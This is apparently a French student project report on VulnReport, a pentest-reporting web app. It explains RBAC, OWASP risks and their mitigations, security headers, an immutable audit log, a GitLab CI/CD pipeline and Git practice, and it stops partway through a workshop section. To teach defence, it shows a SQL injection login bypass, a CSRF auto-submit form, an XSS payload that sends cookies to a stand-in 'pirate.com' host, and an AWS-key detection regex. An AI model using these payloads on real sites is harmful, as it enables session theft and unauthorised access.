**RBAC** signifie Role-Based Access Control (Controle d'Acces Base sur les Roles). C'est un modele de securite ou les permissions ne sont pas attribuees directement aux utilisateurs, mais a des **roles**. Les utilisateurs sont ensuite assignes a un role.

**Analogie** : Dans un hopital, on ne donne pas les permissions individuellement a chaque employe. On definit des roles (medecin, infirmier, secretaire) et on associe des permissions a chaque role (les medecins peuvent prescrire, les infirmiers peuvent administrer des soins, les secretaires peuvent planifier des rendez-vous). Quand un nouvel employe arrive, on lui attribue un role et il herite automatiquement des permissions du role.

### Les 3 roles de VulnReport -- Matrice detaillee

| Action | Viewer | Pentester | Admin |
|--------|:------:|:---------:|:-----:|
| Consulter la KB | Oui | Oui | Oui |
| Consulter les rapports publies | Oui | Oui | Oui |
| Consulter ses propres rapports | -- | Oui | Oui (tous) |
| Creer un rapport | Non | Oui | Oui |
| Modifier un rapport | Non | Proprietaire seul | Oui |
| Supprimer un rapport | Non | Proprietaire seul | Oui |
| Gerer les findings | Non | Sur ses rapports | Oui |
| Gerer la KB (CRUD) | Non | Non | Oui |
| Gerer les utilisateurs | Non | Non | Oui |
| Consulter l'audit log | Non | Non | Oui |
| Voir le dashboard | Non | Oui (ses donnees) | Oui (global) |

### L'ownership (propriete)

L'ownership est un concept crucial : un pentester ne peut voir et modifier QUE ses propres rapports. Cela va au-dela du simple RBAC.

**Scenario problematique sans ownership** : Deux pentesters, Alice et Bob, travaillent pour la meme entreprise. Alice teste le systeme du Client X, Bob teste celui du Client Y. Si Alice peut voir les rapports de Bob, elle a acces aux vulnerabilites du Client Y, ce qui est une violation de confidentialite.

**Solution** : Le queryset (la requete de base de donnees) est filtre selon le role :
- Admin : voit TOUS les rapports.
- Pentester : voit uniquement les rapports ou `owner == request.user` (ses propres rapports) + les rapports publies.
- Viewer : voit uniquement les rapports au statut "published".

### La verification cote serveur

**Regle d'or** : On ne fait JAMAIS confiance au client.

Le frontend React peut masquer des boutons (par exemple, ne pas afficher le bouton "Supprimer" pour un Viewer). Mais cacher un bouton n'est PAS une mesure de securite. Un attaquant peut envoyer des requetes directement (avec curl, Postman, ou un script) sans passer par l'interface.

C'est pourquoi chaque endpoint API verifie les permissions COTE SERVEUR :

```python
# Meme si le frontend cache le bouton "Supprimer",
# le backend refuse la requete si l'utilisateur n'a pas le droit :
class ReportDetailView(generics.RetrieveUpdateDestroyAPIView):
    permission_classes = [permissions.IsAuthenticated, IsReportOwnerOrAdmin]
    # Si un Viewer essaie DELETE /api/reports/5/, il recoit une erreur 403 Forbidden
```

### La protection anti self-demotion

Un admin ne peut pas :
- Changer son propre role (par exemple, se retrograder en Viewer par accident).
- Desactiver son propre compte.

Cela empeche une situation ou le systeme n'aurait plus aucun administrateur.

---

## 4.3 Les vulnerabilites OWASP et comment on s'en protege

### Injection SQL

**Ce que c'est** : L'injection SQL est une attaque ou un pirate envoie du code SQL malveillant a travers un champ de saisie (comme un formulaire de connexion) pour manipuler la base de donnees.

**Analogie** : Imaginons que vous commandez un sandwich au comptoir d'un restaurant. Au lieu de dire "Un jambon-beurre", vous dites "Un jambon-beurre ET ouvre-moi la caisse". Si le serveur execute betement tout ce qu'on lui dit, il va vous donner le sandwich ET ouvrir la caisse. L'injection SQL, c'est pareil : l'attaquant ajoute des commandes a la fin de sa saisie.

**Comment un attaquant l'exploite** :
```
Champ de login : admin' OR '1'='1' --
Requete SQL generee : SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
Resultat : La condition OR '1'='1' est toujours vraie, donc TOUS les utilisateurs sont retournes.
```

**Ce qu'on a mis en place dans VulnReport** :
- **ORM Django** : Toutes les interactions avec la base passent par l'ORM qui genere des requetes parametrees. Les donnees utilisateur sont traitees comme des DONNEES, jamais comme du SQL.
- **Aucune requete SQL brute** : Aucun appel a `raw()`, `extra()` ou `cursor.execute()` dans le code.
- **Validation des entrees** : Les serializers DRF valident les types et les formats avant tout traitement.
- **Moindre privilege sur la base** : Le compte PostgreSQL utilise par l'application n'a que les droits minimum necessaires.

### Cross-Site Scripting (XSS)

**Ce que c'est** : Le XSS est une attaque ou un pirate injecte du code JavaScript malveillant dans une page web. Ce code s'execute dans le navigateur des autres utilisateurs.

**Analogie** : Imaginons un tableau d'affichage dans un hall d'hotel. Normalement, on y met des annonces textuelles. Mais si quelqu'un colle une affiche avec une fausse alarme incendie, tous les gens qui la voient vont paniquer. Le XSS, c'est pareil : l'attaquant "colle" du JavaScript malveillant sur une page, et tous les utilisateurs qui visitent la page executent ce JavaScript sans le savoir.

**Comment un attaquant l'exploite** :
```
Champ "titre du rapport" : <script>document.location='http://pirate.com/steal?cookie='+document.cookie</script>
Si le titre est affiche sans echappement, le navigateur execute le script
et envoie le cookie de session de l'utilisateur au pirate.
```

**Ce qu'on a mis en place dans VulnReport** :
- **Echappement automatique React** : React echappe automatiquement tout le contenu avant de l'afficher. Le `<script>` serait affiche comme du texte, pas execute.
- **Content-Security-Policy (CSP)** : La CSP interdit l'execution de scripts inline. Meme si un XSS passe l'echappement React, la CSP bloque l'execution.
- **Cookies HttpOnly** : Meme si un XSS s'execute, il ne peut pas lire le cookie de session.
- **Validation des entrees** : Les serializers DRF valident et sanitisent les champs.

### Broken Access Control

**Ce que c'est** : L'application ne verifie pas correctement les droits d'acces.

**Analogie** : C'est comme un immeuble ou les portes des appartements ont des serrures, mais les verrous ne fonctionnent pas. N'importe qui peut entrer dans n'importe quel appartement.

**Comment un attaquant l'exploite** :
```
1. Le pentester Alice est connectee et consulte son rapport : GET /api/reports/1/
2. Elle change l'URL en GET /api/reports/2/ (le rapport de Bob)
3. Si le backend ne verifie pas l'ownership, Alice voit le rapport de Bob.
```

**Ce qu'on a mis en place dans VulnReport** :
- **RBAC strict** avec 5 classes de permissions.
- **Verification d'ownership** : `IsReportOwnerOrAdmin` verifie `obj.owner == request.user` sur CHAQUE requete.
- **Filtrage du queryset** : Les pentesters ne voient que leurs propres rapports dans les listes.
- **Tests automatises** : 86 tests verifient que les controles d'acces fonctionnent correctement.

### CSRF (Cross-Site Request Forgery)

**Ce que c'est** : L'attaquant fait en sorte que le navigateur de la victime envoie une requete non desiree a un site ou elle est connectee.

**Analogie** : Imaginons que vous etes a la banque avec votre carte. Un escroc vous tend un formulaire de "sondage" qui est en fait un formulaire de virement bancaire. Vous signez le formulaire sans le lire, et l'escroc recupere l'argent. Le CSRF fonctionne de la meme facon : le site malveillant soumet un formulaire vers VulnReport en utilisant la session de la victime.

**Comment un attaquant l'exploite** :
```html
<!-- Page malveillante visitee par la victime -->
<form action="http://vulnreport.com/api/reports/1/" method="POST">
  <input type="hidden" name="status" value="published">
</form>
<script>document.forms[0].submit();</script>
<!-- Le navigateur envoie la requete avec le cookie de session de la victime -->
```

**Ce qu'on a mis en place dans VulnReport** :
- **Token CSRF Django** : Chaque requete POST/PUT/PATCH/DELETE doit inclure un token CSRF valide dans le header `X-CSRFToken`. Le site malveillant ne peut pas connaitre ce token.
- **SameSite=Strict** : Le cookie de session n'est pas envoye lors de requetes cross-site. Le formulaire malveillant n'aura pas le cookie.

### Security Misconfiguration

**Ce que c'est** : Le logiciel est correctement code mais mal configure.

**Ce qu'on a mis en place** :
- `DEBUG=False` en production (obligatoire, validation `ImproperlyConfigured`).
- `ALLOWED_HOSTS` obligatoire quand DEBUG est desactive.
- Chemin d'administration renomme (`/gestion-securisee/` au lieu de `/admin/`).
- `server_tokens off` dans Nginx (cache la version).
- Conteneurs Docker en `read_only`.
- Variables d'environnement pour tous les secrets.

### Sensitive Data Exposure

**Ce que c'est** : Des donnees sensibles sont exposees par manque de protection.

**Ce qu'on a mis en place** :
- Hashage Argon2id pour les mots de passe.
- Secrets dans les variables d'environnement (jamais dans le code).
- Headers de securite (HSTS pour forcer HTTPS, CSP pour restreindre les sources).
- Pas de donnees sensibles dans les logs d'audit (les mots de passe ne sont jamais logues).
- Messages d'erreur generiques (pas d'information technique dans les erreurs retournees au client).

### Supply Chain (Composants Vulnerables)

**Ce que c'est** : L'application utilise des bibliotheques tierces contenant des failles connues.

**Ce qu'on a mis en place** :
- Versions epinglees dans `requirements.txt` et `package.json`.
- Scans automatises a chaque pipeline : Safety (Python), Trivy (Python + Docker), npm audit (JavaScript).
- Images Docker minimales (Alpine) pour reduire la surface d'attaque.

---

## 4.4 Les headers HTTP de securite

### HSTS (Strict-Transport-Security)

**Header** : `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`

**Explication** : Une fois que le navigateur a visite le site en HTTPS, il refuse de se connecter en HTTP pendant 2 ans (63 072 000 secondes). Cela empeche les attaques de downgrade (forcer le navigateur a passer en HTTP pour intercepter le trafic).

**Analogie** : C'est comme une regle dans un immeuble : "Une fois que vous avez utilise l'ascenseur securise, vous ne pouvez plus prendre l'escalier de service non surveille pendant 2 ans."

### CSP (Content-Security-Policy)

**Header** : `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none';`

**Explication** : La CSP definit les sources de contenu autorisees. `'self'` signifie "seulement depuis le meme domaine". Concretement :
- `script-src 'self'` : Les scripts ne peuvent venir que de notre serveur. Un script injecte par un attaquant (XSS) depuis un autre domaine sera bloque.
- `frame-ancestors 'none'` : Le site ne peut pas etre integre dans un iframe (protection clickjacking).
- `connect-src 'self'` : Les appels API ne peuvent aller que vers notre serveur.

**Note** : `style-src 'self' 'unsafe-inline'` est necessaire pour React qui genere des styles inline. C'est un risque residuel documente.

### X-Frame-Options

**Header** : `X-Frame-Options: DENY`

**Explication** : Empeche d'integrer le site dans un iframe. Cela protege contre le **clickjacking** : une attaque ou un site malveillant place un iframe invisible de VulnReport par-dessus un bouton. L'utilisateur croit cliquer sur le bouton du site malveillant, mais il clique en fait sur un bouton de VulnReport.

### X-Content-Type-Options

**Header** : `X-Content-Type-Options: nosniff`

**Explication** : Empeche le navigateur de "deviner" le type MIME d'un fichier. Sans ce header, un navigateur pourrait traiter un fichier texte comme du JavaScript et l'executer.

### Referrer-Policy

**Header** : `Referrer-Policy: strict-origin-when-cross-origin`

**Explication** : Controle les informations envoyees dans le header `Referer` quand l'utilisateur navigue vers un autre site. Cela empeche de fuitier des URL internes (qui pourraient contenir des identifiants ou des tokens).

### Permissions-Policy

**Header** : `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()`

**Explication** : Desactive les APIs du navigateur qui ne sont pas necessaires pour l'application (camera, micro, geolocalisation, etc.). Cela reduit la surface d'attaque : meme si un XSS s'execute, il ne pourra pas activer la camera ou le micro de l'utilisateur.

---

## 4.5 L'audit log

### Pourquoi la tracabilite est importante

La tracabilite repond a quatre questions fondamentales en securite :
- **Qui** a fait l'action ? (l'acteur)
- **Quoi** a ete fait ? (l'action)
- **Sur quoi** ? (l'objet)
- **Quand** ? (le timestamp)

**Analogie** : C'est comme les cameras de surveillance d'un magasin. Elles n'empechent pas les vols, mais elles permettent de savoir qui a vole quoi et quand. C'est essentiel pour l'investigation apres un incident.

### Quelles actions sont loguees

VulnReport trace 18 types d'actions :

| Action | Declencheur |
|--------|-------------|
| login | Connexion reussie |
| logout | Deconnexion |
| register_user | Creation de compte (admin) |
| update_user | Modification de compte |
| change_password | Changement de mot de passe |
| create_report | Creation de rapport |
| update_report | Modification de rapport |
| delete_report | Suppression de rapport |
| create_finding | Ajout d'un finding |
| update_finding | Modification d'un finding |
| delete_finding | Suppression d'un finding |
| reorder_findings | Reorganisation des findings |
| create_kb_entry | Creation d'entree KB |
| update_kb_entry | Modification d'entree KB |
| delete_kb_entry | Suppression d'entree KB |
| create_resource | Creation de ressource |
| update_resource | Modification de ressource |
| delete_resource | Suppression de ressource |

### L'immutabilite

L'immutabilite signifie que les logs ne peuvent etre ni modifies ni supprimes. C'est garanti par le code Python :

```python
class AuditLog(models.Model):
    def save(self, *args, **kwargs):
        if self.pk:  # Si l'enregistrement existe deja
            raise ValueError("Audit log entries are immutable and cannot be updated.")
        super().save(*args, **kwargs)  # Sinon, creation autorisee

    def delete(self, *args, **kwargs):
        raise ValueError("Audit log entries cannot be deleted.")
```

Meme un administrateur avec un acces direct a l'application ne peut pas alterer les logs. C'est une garantie forte pour la forensique et la conformite.

### La non-repudiation

La **non-repudiation** est le fait qu'un utilisateur ne peut pas nier avoir effectue une action. Grace a l'audit log immutable, si un admin modifie le role d'un utilisateur, cela est trace de maniere irrefutable : l'acteur, l'action, la cible et le moment sont enregistres et ne peuvent pas etre supprimes.

---

## 4.6 L'audit de securite realise

Un audit de securite complet du code a ete realise et a identifie **79 issues** :

| Severite | Nombre | Exemples |
|----------|--------|----------|
| CRITIQUE | 4 | SECRET_KEY nullable, credentials par defaut, pipeline non-bloquant, pas de rate limiting |
| HAUTE | 17 | Password validators non appliques, CSP avec unsafe-inline, cookies sans flags |
| MOYENNE | 34 | Enumeration de comptes, CVSS non valide, admin path par defaut, conteneurs root |
| FAIBLE | 24 | Headers manquants, dependances, useEffect mal places |

### Les corrections les plus importantes

1. **Migration vers Argon2id** (Critique) : Remplacement du hashage par defaut (PBKDF2) par Argon2id.
2. **Rate limiting double couche** (Critique) : Ajout de limitations a la fois dans Django et Nginx.
3. **TruffleHog bloquant** (Critique) : La detection de secrets bloque le pipeline.
4. **RBAC complet** (Critique) : Implementation de 5 classes de permissions avec verification d'ownership.
5. **Conteneurs hardened** (Haute) : read_only, utilisateur non-root, tmpfs, images Alpine.
6. **Headers de securite** (Haute) : CSP, HSTS, X-Frame-Options, Permissions-Policy.
7. **Audit log immutable** (Haute) : Surcharge de save() et delete().

### Les risques residuels

Malgre les corrections, certains risques subsistent :

| Risque | Niveau | Raison |
|--------|--------|--------|
| Absence de TLS (HTTPS) | Eleve | Environnement de dev. A corriger en production. |
| CSP avec unsafe-inline (styles) | Moyen | Necessaire pour React. Scripts strictement restreints. |
| Pas de 2FA | Moyen | Rate limiting et politique MDP compensent partiellement. |
| Pas de WAF | Moyen | Rate limiting et protections Django offrent une base. |
| Pas de chiffrement au repos | Moyen | Acces DB restreint au reseau Docker interne. |
| SAST/SCA non bloquants | Faible | Artefacts archives mais review manuelle necessaire. |

---

# SECTION 5 : LE PIPELINE CI/CD

## 5.1 Les concepts

### Qu'est-ce que CI/CD ?

**CI** (Continuous Integration -- Integration Continue) : A chaque fois qu'un developpeur envoie du code (push), le code est automatiquement verifie par une serie de tests et d'analyses. C'est comme un controle qualite automatique en usine.

**CD** (Continuous Deployment -- Deploiement Continu) : Une fois le code verifie, il est automatiquement deploye sur l'environnement de production. C'est la suite logique du CI.

**Analogie** : Imaginons une usine de voitures.
- **CI** : Chaque piece qui sort de la chaine de montage passe automatiquement par un controle qualite (tests, mesures, verification visuelle). Si une piece est defectueuse, elle est rejetee avant d'etre montee sur une voiture.
- **CD** : Les voitures validees sont automatiquement envoyees aux concessions.

### Qu'est-ce que GitLab CI/CD ?

**GitLab CI/CD** est le systeme d'integration continue integre a GitLab. Il execute automatiquement des commandes (jobs) quand on pousse du code sur le depot.

### Le fichier .gitlab-ci.yml

C'est un fichier de configuration au format YAML qui definit le pipeline. Il se trouve a la racine du projet et contient :
- La liste des **stages** (etapes).
- La definition de chaque **job** (quelle image Docker utiliser, quelles commandes executer).
- Les conditions de declenchement (quand le job s'execute).
- La configuration des artefacts (fichiers a conserver).

### Vocabulaire

- **Stage** : Une etape du pipeline (par exemple "test" ou "build"). Les stages s'executent sequentiellement.
- **Job** : Une tache a effectuer dans un stage. Les jobs d'un meme stage s'executent en parallele.
- **Runner** : La machine qui execute les jobs. GitLab.com fournit des "shared runners" (machines dans le cloud).
- **Artifact** : Un fichier genere par un job et conserve par GitLab. Par exemple, un rapport de securite au format JSON.

### Comment le pipeline se declenche

A chaque `git push` sur n'importe quelle branche, GitLab detecte la presence du fichier `.gitlab-ci.yml` et declenche automatiquement le pipeline. Le pipeline execute les stages dans l'ordre defini.

---

## 5.2 Les 7 stages du pipeline

```
+--------+      +--------+      +--------+      +--------+
| 1.LINT | ---> | 2.SAST | ---> | 3.SCA  | ---> |4.BUILD |
| flake8 |      | bandit |      | safety |      | docker |
| ruff   |      |semgrep |      | trivy  |      | build  |
|        |      |        |      |npm aud.|      |        |
+--------+      +--------+      +--------+      +--------+
                                                     |
+--------+      +--------+      +--------+           |
|7.DEPLOY| <--- |6.SECRET| <--- | 5.DAST | <---------+
|manuel  |      |truffle |      |  ZAP   |
|main+   |      |hog     |      |baseline|
|prod    |      |BLOQUANT|      |manuel  |
+--------+      +--------+      +--------+
```

### Stage 1 : Lint (flake8 + ruff)

**Outil** : flake8 et ruff

**Ce que c'est** : Le "linting" est la verification de la qualite et de la conformite du code. C'est comme une relecture grammaticale et orthographique d'un texte.

**Ce que ca detecte** :
- Erreurs de syntaxe Python.
- Non-respect du style PEP8 (le guide de style officiel de Python).
- Code mort (variables declarees mais jamais utilisees).
- Lignes trop longues.
- Imports inutilises.

**Pourquoi c'est utile** : Un code propre et coherent est plus facile a auditer pour la securite. Les erreurs de style peuvent aussi masquer des bugs.

**ruff** est un linter Python ultra-rapide ecrit en Rust, qui remplace progressivement flake8.

### Stage 2 : SAST (Bandit + Semgrep)

**Qu'est-ce que le SAST ?** Le SAST (Static Application Security Testing) est une analyse de securite qui examine le code source **sans l'executer**. C'est comme lire la recette d'un gateau pour trouver des ingredients potentiellement toxiques, sans cuisiner le gateau.

**Bandit** : Un outil specifique a Python qui detecte des patterns dangereux :
- `B104` : Le serveur ecoute sur `0.0.0.0` (toutes les interfaces -- potentiellement dangereux en dehors de Docker).
- `B105/B106` : Mots de passe ou secrets en dur dans le code.
- `B602` : Utilisation de `subprocess` avec `shell=True` (injection de commandes possible).
- `B608` : Construction de requetes SQL par concatenation de chaines.
- `B303` : Utilisation de MD5 ou SHA1 pour le hashage (algorithmes faibles).

**Semgrep** : Un outil d'analyse statique plus generaliste qui utilise des regles communautaires pour detecter des patterns vulnerables. Le jeu de regles `auto` selectionne automatiquement les regles pertinentes pour Python et Django.

**Avantages du SAST** :
- Detection precoce (avant meme que le code soit execute).
- Rapide a executer.
- Couvre tout le code, meme le code mort.

**Limites du SAST** :
- Faux positifs (il peut signaler des problemes qui n'en sont pas).
- Ne detecte pas les problemes a l'execution (runtime).

### Stage 3 : SCA (Safety + Trivy + npm audit)

**Qu'est-ce que le SCA ?** Le SCA (Software Composition Analysis) analyse les **dependances** du projet pour trouver des vulnerabilites connues (CVE).

**Analogie** : C'est comme verifier si les ingredients que vous avez achetes font l'objet d'un rappel produit. Meme si votre recette est parfaite, si un ingredient est contamine, le plat est dangereux.

**Safety** : Analyse les dependances Python (requirements.txt) contre une base de CVE connues.

**Trivy** : Analyse plus large -- dependances Python, images Docker, configuration. Trivy est developpe par Aqua Security et est tres populaire dans le monde DevSecOps.

**npm audit** : Analyse les dependances JavaScript (package.json) contre la base de vulnerabilites npm.

**Ce que ca detecte** :
- CVE-2019-10744 : Prototype Pollution dans lodash 3.0.0 (CRITIQUE).
- CVE-2020-11022 : XSS dans jQuery 3.2.1 (MOYENNE).
- CVE-2021-44906 : Prototype Pollution dans minimist 0.0.8 (CRITIQUE).
- Et d'autres CVE dans les dependances Python si elles existent.

**Qu'est-ce qu'une CVE ?** CVE (Common Vulnerabilities and Exposures) est un systeme d'identification des vulnerabilites. Chaque vulnerabilite connue recoit un identifiant unique (par exemple CVE-2021-44906) et est documentee publiquement avec sa severite et les versions affectees.

### Stage 4 : Build (Docker)

**Outil** : Docker-in-Docker (DinD)

**Ce que ca fait** : Construit les images Docker de l'application (backend, frontend) et les pousse vers le registry GitLab. Le tag utilise est le SHA court du commit (`$CI_COMMIT_SHORT_SHA`).

**Pourquoi c'est important** : Si le build echoue, cela signifie que le code ne peut pas etre deploye. Inutile de continuer les etapes suivantes.

### Stage 5 : DAST (OWASP ZAP)

**Qu'est-ce que le DAST ?** Le DAST (Dynamic Application Security Testing) teste l'application **en cours d'execution**. Contrairement au SAST qui lit le code, le DAST envoie des requetes HTTP reelles et analyse les reponses.

**Analogie** : Le SAST, c'est comme lire les plans d'un batiment pour trouver des failles. Le DAST, c'est comme envoyer un cambrioleur essayer d'entrer dans le batiment.

**OWASP ZAP** (Zed Attack Proxy) est un scanner de securite web open source. Il fonctionne en mode "baseline" :

1. **Spider** : ZAP explore automatiquement toutes les pages de l'application.
2. **Scan passif** : ZAP analyse les reponses HTTP (headers manquants, cookies non securises).
3. **Rapport** : ZAP genere un rapport HTML et JSON des vulnerabilites trouvees.

**Ce que ca detecte** :
- Headers de securite manquants ou mal configures.
- Cookies sans flags Secure/HttpOnly.
- XSS (Reflected et Stored).
- Injection SQL (dans certains cas).
- CSRF (absence de tokens).
- Divulgation d'information.

**Pourquoi le DAST est manuel** : Le DAST necessite une application deployee et accessible. Le scan peut prendre plusieurs minutes. Il est donc configure en declenchement manuel (`when: manual`) pour ne pas ralentir le pipeline a chaque push.

### Stage 6 : Secrets (TruffleHog)

**Outil** : TruffleHog

**Ce que ca fait** : Scanne le code source a la recherche de secrets (mots de passe, cles API, tokens, cles privees) commites accidentellement.

**Comment ca marche** : TruffleHog utilise deux methodes complementaires :
1. **Detection par regex** : Recherche de patterns connus (par exemple `AKIA[0-9A-Z]{16}` pour les cles AWS).
2. **Detection par entropie** : Mesure le "desordre" d'une chaine. Une chaine a haute entropie (comme `a8f3b2c7e9d1f4a6`) est probablement un secret.

**Pourquoi c'est BLOQUANT** : C'est le seul job de securite sans `allow_failure: true`. Si TruffleHog detecte un secret dans le code, le pipeline est immediatement bloque. Raison : la fuite de secrets est consideree comme un risque critique. Un secret commite est permanent dans l'historique Git, meme s'il est supprime dans un commit ulterieur.

### Stage 7 : Deploy

**Ce que ca fait** : Deploie l'application en production en recuparant les images Docker du registry GitLab.

**Conditions de declenchement** :
- Branche `main` uniquement.
- Variable `ENVIRONMENT` a la valeur `prod`.
- Declenchement manuel (bouton "Play" dans l'interface GitLab).

---

## 5.3 La politique de blocage

| Job | Bloquant ? | Raison |
|-----|-----------|--------|
| flake8/ruff | Non (`allow_failure: true`) | Le non-respect du style ne bloque pas, mais les rapports sont archives. |
| Bandit | Non (`allow_failure: true`) | Les vulnerabilites sont archivees. Amelioration recommandee : bloquer sur HIGH/CRITICAL. |
| Semgrep | Non (`allow_failure: true`) | Idem Bandit. |
| Safety | Non (`allow_failure: true`) | Les CVE sont archivees mais ne bloquent pas. |
| Trivy | Non (`allow_failure: true`) | Idem Safety. |
| npm audit | Non (`allow_failure: true`) | Idem. |
| Docker build | Oui | Si le build echoue, le code ne peut pas etre deploye. |
| ZAP | Non (manuel) | Le DAST est informatif et declenche manuellement. |
| **TruffleHog** | **Oui** | **La fuite de secrets est un risque critique -- blocage immediat.** |
| Deploy | Oui (manuel) | Protege par des conditions et un declenchement manuel. |

**Pourquoi les jobs SAST/SCA ne sont pas bloquants ?** En phase de developpement, bloquer le pipeline a chaque alerte de securite ralentirait considerablement le travail. La strategie est de collecter les rapports (artefacts) et de les revoir manuellement. L'amelioration recommandee est de rendre les findings HIGH/CRITICAL bloquants une fois le projet stabilise.

---

## 5.4 Les resultats actuels du pipeline

Le pipeline tourne sur **GitLab.com** avec les shared runners (machines partagees fournies gratuitement par GitLab).

- **6 sur 8 jobs** reussissent sans probleme.
- **2 jobs** sont en `allow_failure` (Trivy image scan et limitations Docker-in-Docker sur les shared runners).
- Les artefacts sont generes et conserves pendant 1 semaine.
- Le pipeline complet s'execute en quelques minutes.

---

# SECTION 6 : GIT ET GITLAB

## 6.1 Les concepts Git

### Qu'est-ce que Git ?

**Git** est un systeme de controle de version distribue. Il permet de :
- Garder l'historique complet de toutes les modifications du code.
- Travailler a plusieurs sur le meme code sans conflits.
- Revenir a une version anterieure en cas de probleme.

**Analogie** : Git est comme un systeme de sauvegarde ultra-puissant pour le code. Imaginez que chaque fois que vous modifiez un document Word, vous gardiez une copie horodatee. Git fait ca automatiquement et intelligemment.

### Qu'est-ce qu'un commit ?

Un **commit** est un instantane (snapshot) du code a un moment donne. C'est comme une photo du code avec un message qui decrit les changements.

```
Commit 1: "Ajout du modele User avec champ role"
Commit 2: "Implementation du login avec Argon2id"
Commit 3: "Ajout du RBAC sur les endpoints rapports"
```

### Qu'est-ce qu'une branche ?

Une **branche** est une ligne de developpement independante. C'est comme un chemin parallele ou on peut travailler sans affecter le code principal.

**Analogie** : Imaginons un livre. La branche `main` est le manuscrit final. Si un auteur veut ajouter un chapitre, il cree une copie du manuscrit (branche), travaille dessus, et une fois satisfait, il l'incorpore dans le manuscrit final (merge).

### Qu'est-ce qu'un merge ?

Un **merge** est l'action de fusionner les modifications d'une branche dans une autre. C'est le moment ou le nouveau chapitre est incorpore dans le manuscrit final.

### Les conventions de branches du projet

| Prefixe | Usage | Exemple |
|---------|-------|---------|
| `feature/` | Nouvelle fonctionnalite | `feature/4-creation-rapport` |
| `fix/` | Correction de bug | `fix/15-erreur-affichage-dashboard` |
| `sec/` | Mesure de securite | `sec/8-ajout-headers-http` |
| `ops/` ou `ci/` | Infrastructure Docker, CI/CD | `ops/2-creation-dockerfile` |
| `docs/` | Documentation | `docs/25-redaction-rapport-architecture` |
| `refactor/` | Refactoring | `refactor/11-nettoyage-auth` |

### La regle : 1 issue = 1 branche = 1 Merge Request

Chaque tache (issue GitLab) est associee a une seule branche et une seule Merge Request. Cela permet :
- De suivre l'avancement de chaque tache.
- De faire une revue de code avant d'integrer les modifications.
- De garder un historique propre.

---

## 6.2 GitLab

### Qu'est-ce que GitLab ?

**GitLab** est une plateforme de gestion de code source qui integre Git, CI/CD, et des outils de gestion de projet. C'est un concurrent de GitHub.

**Difference avec GitHub** : GitLab offre un pipeline CI/CD integre nativement (pas besoin de GitHub Actions), et permet d'heberger ses propres instances. Pour notre projet, on utilise GitLab.com (version cloud gratuite).

### Les issues

Une **issue** est une tache ou un probleme a resoudre. Chaque issue a :
- Un titre et une description.
- Un label (categorie).
- Un milestone (sprint).
- Un assignee (personne responsable).
- Un etat (ouverte ou fermee).

### Les milestones

Un **milestone** regroupe les issues d'un sprint. On a 3 milestones :
- Sprint 1 (ferme) -- Fondations
- Sprint 2 (ferme) -- Coeur Fonctionnel
- Sprint 3 (ouvert) -- Pipeline et Finalisation

### Les labels

Les **labels** categorisent les issues. 10 labels sont configures dans le projet (security, devops, frontend, backend, docs, etc.).

### Les Merge Requests (MR)

Une **Merge Request** est une demande de fusion d'une branche dans la branche principale. Elle permet :
- De voir les modifications apportees (diff).
- De faire une revue de code (review).
- De verifier que le pipeline CI/CD est vert.
- D'approuver et de fusionner.

### Le board Kanban

Le **board Kanban** est une vue visuelle de l'avancement du projet. Les issues sont organisees en colonnes :
- **Open** : A faire
- **In Progress** : En cours
- **Done** : Termine

---

## 6.3 L'etat du depot GitLab

- **URL du projet** : GitLab.com (depot prive du groupe).
- **25 issues** creees et fermees (toutes les taches planifiees).
- **3 milestones** : Sprint 1 (ferme), Sprint 2 (ferme), Sprint 3 (ouvert).
- **10 labels** configures pour categoriser les issues.
- **Variables CI/CD** configurees (DJANGO_SECRET_KEY, DB_PASSWORD, SNYK_TOKEN, etc.).
- **Pipeline fonctionnel** : 7 stages, 6/8 jobs reussis.

---

# SECTION 7 : LES ATELIERS PRATIQUES

## 7.1 Atelier 1 -- Presentation du Projet

L'atelier 1 consistait a rediger trois documents fondateurs du projet :

### Le Plan de Developpement

- **Vision** : VulnReport accelere, standardise et fiabilise la redaction de rapports de pentest.
- **Equipe** : 4 membres avec des roles complementaires.
- **Methode** : Agile legere en 3 sprints, daily express sur Discord.
- **Planning** : 23 mars -- 10 avril 2026, 4 jalons de validation.
- **Conventions** : 1 issue = 1 branche = 1 MR, prefixes de branches standardises.

### Le Document d'Architecture Technique (DAT)

- **Stack** : React (frontend) + Django/DRF (backend) + PostgreSQL (BDD) + Docker + Nginx.
- **Schema d'architecture** : 4 conteneurs isoles dans un reseau Docker bridge, seul Nginx expose.
- **Modele de donnees** : 6 tables (User, Report, Finding, KBEntry, Resource, AuditLog) avec contraintes d'integrite.
- **Authentification** : Argon2id, sessions cote serveur, cookies securises.
- **RBAC** : 3 roles (Viewer, Pentester, Admin) avec matrice de permissions detaillee.
- **Pipeline** : 5 etapes (Lint, SAST, SCA, Build, DAST).

### L'Analyse des Risques

- **Actifs identifies** : 7 actifs (comptes utilisateurs, rapports, KB, audit log, code source, BDD, pipeline).
- **Matrice des risques** : 10 risques evalues selon Probabilite x Impact.
  - Risque le plus critique : Injection SQL (P=3, I=3, Score=9).
  - Risque le plus faible : DoS (P=1, I=2, Score=2).
- **Analyse CIA** : Chaque risque est associe aux axes CIA qu'il menace.
- **Mesures de mitigation** : Pour chaque risque, les mesures de protection retenues.
- **Risques residuels** : Broken Access Control et Supply Chain identifies comme risques residuels.

---

## 7.2 Atelier 2 -- Pipeline CI/CD + SCA

### Les 7 exercices du pipeline

**Exercice 1 -- Pipeline avec 4 stages** :
Creation d'un pipeline GitLab avec 4 stages sequentiels : `build`, `test`, `integration`, `deploy`. Les stages s'executent dans l'ordre defini. Si un stage echoue, les suivants ne s'executent pas.

**Exercice 2 -- Job d'integration avec artefact** :
Un job dans le stage `integration` genere un fichier `output.txt` conserve comme artefact pendant 1 semaine. Les artefacts sont telechargeable depuis l'interface GitLab.

**Exercice 3 -- Forcer une erreur et conserver l'artefact** :
Introduction de `exit 1` dans le job pour simuler un echec. Le parametre `artifacts:when: always` permet de conserver l'artefact meme en cas d'echec.

**Exercice 4 -- allow_failure** :
Le mot-cle `allow_failure: true` permet au pipeline de continuer malgre l'echec du job d'integration. Le job est marque en orange (avertissement) au lieu de rouge (erreur).

**Exercice 5 -- Job de deploiement manuel** :
